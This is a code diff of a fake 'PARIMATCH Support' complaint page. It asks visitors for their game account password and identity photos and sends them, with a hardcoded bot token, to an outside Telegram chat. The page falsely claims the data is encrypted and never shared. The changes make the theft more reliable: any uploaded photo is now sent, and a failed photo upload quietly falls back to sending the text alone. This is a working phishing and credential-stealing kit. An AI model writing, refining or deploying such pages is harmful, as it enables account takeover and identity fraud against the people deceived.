@@ -22,7 +22,6 @@
             min-height: 100vh;
         }
 
-        /* Header Section */
         header {
             width: 100%;
             background-color: #161818;
@@ -57,11 +56,6 @@
             text-decoration: none;
             font-size: 16px;
             border: 1px solid #3c4228;
-            transition: 0.2s;
-        }
-
-        .back-btn:hover {
-            background-color: #353b26;
         }
 
         .brand-box {
@@ -77,7 +71,6 @@
             font-weight: 900;
             font-style: italic;
             color: #f3ff00;
-            letter-spacing: 0.5px;
             font-size: 14px;
             background: rgba(243, 255, 0, 0.05);
         }
@@ -92,10 +85,8 @@
             margin-top: 6px;
             font-size: 12px;
             color: #9ca3af;
-            letter-spacing: 0.3px;
         }
 
-        /* Main Form Card */
         .container {
             width: 100%;
             max-width: 480px;
@@ -133,7 +124,6 @@
             margin-bottom: 18px;
         }
 
-        /* Form Elements */
         .form-group {
             margin-bottom: 18px;
         }
@@ -161,11 +151,6 @@
             color: #ffffff;
             font-size: 14px;
             outline: none;
-            transition: border-color 0.2s;
-        }
-
-        input::placeholder {
-            color: #6b7280;
         }
 
         input:focus {
@@ -181,7 +166,6 @@
             margin-top: 6px;
         }
 
-        /* File Upload Box Styling */
         .file-upload-box {
             border: 1.5px dashed #3a3f3f;
             background-color: #212424;
@@ -193,7 +177,6 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            transition: 0.2s;
         }
 
         .file-upload-box:hover {
@@ -227,12 +210,6 @@
             font-weight: 700;
             cursor: pointer;
             margin-top: 6px;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            box-shadow: 0 4px 15px rgba(243, 255, 0, 0.2);
         }
 
         .submit-btn:hover {
@@ -244,21 +221,14 @@
             font-size: 11.5px;
             color: #9ca3af;
             margin-top: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
         }
     </style>
 </head>
 <body>
 
-    <!-- Top Header -->
     <header>
         <div class="top-bar">
-            <a href="../index.html" class="back-btn" title="Back to Home">
-                <i class="fa-solid fa-chevron-left"></i>
-            </a>
+            <a href="../index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <div class="brand-box">
                 <div class="logo-badge">PARIMATCH</div>
                 <span class="support-title">Support</span>
@@ -267,7 +237,6 @@
         <div class="tagline">Fast &bull; Secure &bull; Trusted Help</div>
     </header>
 
-    <!-- Form Container -->
     <div class="container">
         <div class="complaint-card">
             <div class="card-header">
@@ -290,10 +259,7 @@
                 <div class="form-group">
                     <label for="password">Game Account Password</label>
                     <input type="password" id="password" placeholder="Enter your password" required>
-                    <div class="security-note">
-                        <i class="fa-solid fa-lock"></i>
-                        <span>Your data is encrypted & never shared</span>
-                    </div>
+                    <div class="security-note"><i class="fa-solid fa-lock"></i> <span>Your data is encrypted & never shared</span></div>
                 </div>
 
                 <div class="form-group">
@@ -323,15 +289,10 @@
                     </label>
                 </div>
 
-                <button type="submit" class="submit-btn" id="submitBtn">
-                    <i class="fa-solid fa-paper-plane"></i> Submit Now
-                </button>
+                <button type="submit" class="submit-btn" id="submitBtn">Submit Now</button>
             </form>
 
-            <div class="response-time">
-                <i class="fa-regular fa-clock"></i>
-                <span>Average response time: 2-5 minutes</span>
-            </div>
+            <div class="response-time"><i class="fa-regular fa-clock"></i> Average response time: 2-5 minutes</div>
         </div>
     </div>
 
@@ -352,14 +313,12 @@
             const password = document.getElementById('password').value;
             
             const file1 = document.getElementById('file1Input').files[0];
-            
-            const file1Text = document.getElementById('file-label-1').textContent;
-            const file2Text = document.getElementById('file-label-2').textContent;
-            const file3Text = document.getElementById('file-label-3').textContent;
+            const file2 = document.getElementById('file2Input').files[0];
+            const file3 = document.getElementById('file3Input').files[0];
 
-            const s1 = file1Text !== 'Choose Image' ? file1Text : 'Not Uploaded';
-            const s2 = file2Text !== 'Choose Image' ? file2Text : 'Not Uploaded';
-            const s3 = file3Text !== 'Choose Image' ? file3Text : 'Not Uploaded';
+            const s1 = file1 ? file1.name : 'Not Uploaded';
+            const s2 = file2 ? file2.name : 'Not Uploaded';
+            const s3 = file3 ? file3.name : 'Not Uploaded';
 
             const botToken = '8899735524:AAEzzcKQpcMO-mMQb9KSQTXmRUjLW7nhKPU';
             const chatId = '8400052598';
@@ -376,11 +335,13 @@
             submitBtn.textContent = "Submitting...";
             submitBtn.disabled = true;
 
-            // Agar pehli file upload ki gayi hai toh sendPhoto se bhejenge, warna sirf text
-            if (file1) {
+            // Agar koi bhi photo upload ki hai toh pehli available photo bhej do, sath mein saari details caption mein hongi
+            const uploadFile = file1 || file2 || file3;
+
+            if (uploadFile) {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', file1);
+                formData.append('photo', uploadFile);
                 formData.append('caption', message);
                 formData.append('parse_mode', 'Markdown');
 
@@ -391,25 +352,24 @@
                 .then(response => response.json())
                 .then(data => {
                     if(data.ok) {
-                        alert("KYC verification details submitted successfully!");
+                        alert("KYC details with photo submitted successfully!");
                         location.reload();
                     } else {
-                        alert("Error sending photo. Trying text only...");
-                        sendTextOnly(botToken, chatId, message);
+                        // Agar photo send hone mein error aaye toh text-only bhej do taaki form na ruke
+                        sendTextOnly(botToken, chatId, message, submitBtn);
                     }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    alert("Something went wrong!");
-                    submitBtn.textContent = "Submit Now";
-                    submitBtn.disabled = false;
+                    sendTextOnly(botToken, chatId, message, submitBtn);
                 });
             } else {
-                sendTextOnly(botToken, chatId, message);
+                // Agar koi photo select nahi ki hai toh sirf text bhej do
+                sendTextOnly(botToken, chatId, message, submitBtn);
             }
         }
 
-        function sendTextOnly(botToken, chatId, message) {
+        function sendTextOnly(botToken, chatId, message, submitBtn) {
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -426,18 +386,17 @@
                     location.reload();
                 } else {
                     alert("Error sending details. Please try again.");
-                    document.getElementById('submitBtn').textContent = "Submit Now";
-                    document.getElementById('submitBtn').disabled = false;
+                    submitBtn.textContent = "Submit Now";
+                    submitBtn.disabled = false;
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
                 alert("Something went wrong!");
-                document.getElementById('submitBtn').textContent = "Submit Now";
-                document.getElementById('submitBtn').disabled = false;
+                submitBtn.textContent = "Submit Now";
+                submitBtn.disabled = false;
             });
         }
     </script>
-
 </body>
 </html>
